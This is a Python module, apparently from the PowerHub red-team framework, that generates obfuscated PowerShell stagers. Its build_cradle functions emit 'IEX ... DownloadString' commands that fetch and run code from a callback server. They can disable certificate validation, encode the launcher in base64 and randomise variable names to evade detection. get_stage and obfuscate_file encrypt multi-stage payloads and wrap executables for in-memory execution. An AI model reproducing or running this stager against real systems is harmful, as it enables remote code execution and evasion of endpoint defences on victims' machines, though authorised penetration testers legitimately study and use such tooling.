import base64
import binascii
import logging
import os
import random
import re
import string

from powerhub.tools import encrypt_rc4, encrypt_aes, generate_random_key
from powerhub.modules import sanitize_ps1
from powerhub.directories import directories


log = logging.getLogger(__name__)

symbol_list = {None: None}
VARLIST = []


def callback_urls():
    from powerhub.env import powerhub_app as ph_app
    return {
        'http': 'http://%s:%d/%s' % (
            ph_app.args.URI_HOST,
            ph_app.args.URI_PORT if ph_app.args.URI_PORT else ph_app.args.LPORT,
            ph_app.args.URI_PATH+'/' if ph_app.args.URI_PATH else '',
        ),
        'https': 'https://%s:%d/%s' % (
            ph_app.args.URI_HOST,
            ph_app.args.URI_PORT if ph_app.args.URI_PORT else ph_app.args.SSL_PORT,
            ph_app.args.URI_PATH+'/' if ph_app.args.URI_PATH else '',
        ),
    }


# TODO consider https
def webdav_url():
    from powerhub.env import powerhub_app as ph_app
    return 'http://%s:%d/webdav' % (
        ph_app.args.URI_HOST,
        ph_app.args.LPORT,
    )


def build_cradle_https(get_args):
    result = ''

    if get_args['Transport'] == 'https':
        if get_args['NoVerification'] == 'true':
            result += ("[System.Net.ServicePointManager]::ServerCertificate"
                       "ValidationCallback={$true};")
        elif get_args['Fingerprint'] == 'true':
            from powerhub.reverseproxy import FINGERPRINT
            result += ("[System.Net.ServicePointManager]::ServerCertificate"
                       "ValidationCallback={param($1,$2);"
                       "$2.Thumbprint -eq '%s'};" %
                       FINGERPRINT.replace(':', ''))
        elif get_args['CertStore'] == 'true':
            pass
        if get_args['TLS1.2'] == 'true':
            result += ("[Net.ServicePointManager]::SecurityProtocol="
                       "[Net.SecurityProtocolType]::Tls12;")

    return result


def build_cradle_webclient(get_args, key):
    result = ''
    natural = (get_args['Natural'] == 'true')
    web_client = symbol_name('web_client', natural=natural, refresh=True)

    if get_args['Transport'].startswith('http'):
        result += "$%(web_client)s=New-Object Net.WebClient;"

        if get_args['Proxy'] == 'true':
            result += ("$%(web_client)s.Proxy=[Net.WebRequest]::GetSystemWebProxy();"
                       "$%(web_client)s.Proxy.Credentials=[Net.CredentialCache]::"
                       "DefaultCredentials;")

        url = callback_urls()[get_args['Transport']]

        query = "/?t=%(Transport)s&a=%(Amsi)s&k=%(KEX)s" % get_args
        if not get_args['ClipExec'] == 'none':
            query += "&c=%(ClipExec)s" % get_args['ClipExec']

        if get_args['Minimal'] == 'true':
            query += "&m=t"

        if natural:
            query += "&n=t"

        query = encrypt_aes(query, key)
        # Make b64 encoding urlsafe
        query = query.replace('/', '_').replace('+', '-')

        result += "IEX $%(web_client)s.DownloadString('%(url)s%(query)s')"
        result = result % dict(
            url=url,
            query=query,
            web_client=web_client,
        )

    return result


def build_cradle(get_args, key):
    """Build the download cradle given a dict of GET arguments"""
    log.debug("GET arguments: %s" % get_args)

    result = ""
    natural = (get_args['Natural'] == 'true')
    key_var = symbol_name('global_key', natural=natural)

    result += build_cradle_https(get_args)

    if get_args['KEX'] == 'oob' and key:
        result += "$%(key_var)s='%(key)s';"

    result += build_cradle_webclient(get_args, key)

    result = result % dict(
        url=callback_urls()[get_args['Transport']],
        transport=get_args['Transport'],
        amsi=get_args['Amsi'],
        key_var=key_var,
        key=key,
    )

    # make sure to only use single quotes
    assert '"' not in result

    powershell_exe = 'powershell.exe'

    if get_args['Launcher'] == 'cmd':
        result = '%s "%s"' % (powershell_exe, result)
    elif get_args['Launcher'] == 'cmd_enc':
        result = '%s -Enc %s' % (
            powershell_exe,
            binascii.b2a_base64(result.encode('utf-16le')).decode())
    elif get_args['Launcher'] == 'bash':
        result = result.replace('$', '\\$')
        result = '"%s \\\"%s\\\""' % (powershell_exe, result)

    return result


def symbol_name(name, natural=False, refresh=False, debug=False):
    if refresh and name in symbol_list:
        del symbol_list[name]

    if name not in symbol_list:
        if debug:
            # In debug mode, don't obfuscate
            symbol_list[name] = name
        else:
            if natural:
                symbol_list[name] = choose_natural_name()
            else:
                symbol_list[name] = choose_random_name()
    return symbol_list[name]


def choose_natural_name():
    if not VARLIST:
        with open(os.path.join(directories.BASE_DIR, 'variables.txt'), 'r') as fp:
            for line in fp:
                if not line.startswith('#'):
                    VARLIST.append(line.strip())

    result = None
    while not result or result in list(symbol_list.values()):
        result = random.choice(VARLIST)

    return result


def choose_random_name():
    result = None
    length = random.choice(range(4, 8))
    while not result or result in list(symbol_list.values()):
        result = ''.join([random.choice(string.ascii_lowercase)
                          for i in range(length)])
        result = random.choice(string.ascii_uppercase) + result
    return result


def debug_filter(msg, dbg=False):
    """This is a function for debugging statements in jinja2 templates"""
    if dbg:
        return msg + ";"
    return ""


# TODO add jinja include_randomize_whitespace
# TODO add jinja powershell decoys

def get_stage(key, context={}, stage3_files=[], stage3_strings=[],
              debug=False, natural=False):
    from jinja2 import Environment, FileSystemLoader

    env = Environment(loader=FileSystemLoader(
        os.path.join(directories.BASE_DIR, 'templates')
    ))

    def rc4encrypt(msg):
        return base64.b64encode(encrypt_rc4(msg.encode(), key)).decode()

    env.filters['rc4encrypt'] = rc4encrypt
    env.filters['debug'] = lambda msg: debug_filter(msg, dbg=debug)
    env.globals['symbol_name'] = lambda name: symbol_name(name, natural=natural, debug=debug)

    stage1_template = env.get_template(os.path.join('powershell', 'stage1.ps1'))

    stage2_template = env.get_template(os.path.join('powershell', 'stage2.ps1'))
    stage2 = stage2_template.render(**context)
    stage2 = encrypt_rc4(stage2.encode(), key)
    stage2 = base64.b64encode(stage2).decode()

    stage3 = []
    for t in stage3_files + stage3_strings:
        if t in stage3_files:
            buffer = open(t, 'r').read()
        else:
            buffer = t
        buffer = encrypt_aes(buffer, key)
        stage3.append(buffer)

    context['stage2'] = stage2
    context['stage3'] = stage3

    result = stage1_template.render(**context)

    if not debug:
        result = remove_leading_whitespace(result)
        result = remove_blank_lines(result)

    return result


def remove_leading_whitespace(text):
    text = re.sub(r'\s+', ' ', text)
    return text


def remove_blank_lines(text):
    result = [
        line for line in text.splitlines() if line
    ]
    result = '\n'.join(result)
    return result


def wrap_in_ps1(code, name):
    from jinja2 import Environment, FileSystemLoader

    env = Environment(loader=FileSystemLoader(
        os.path.join(directories.BASE_DIR, 'templates')
    ))
    template = env.get_template(os.path.join('powershell', 'exec_dotnet.ps1'))

    code = base64.b64encode(code).decode()
    result = template.render(code=code, name=name)
    return result


def obfuscate_file(fp_in, fp_out, epilogue=''):
    import magic

    code = fp_in.read()

    try:
        code = code.decode()
        file_type = magic.from_buffer(code)
        code = sanitize_ps1(code, file_type)
    except UnicodeError:
        try:
            name = os.path.basename(fp_in.filename)
        except AttributeError:
            # it is a stream, not a file
            name = 'stdin.exe'
        code = wrap_in_ps1(code, name)

    stage3 = [code]
    if epilogue:
        stage3.append(epilogue)

    key = generate_random_key(16)
    # TODO pass arguments
    output = get_stage(key, stage3_strings=stage3)
    fp_out.write(output)
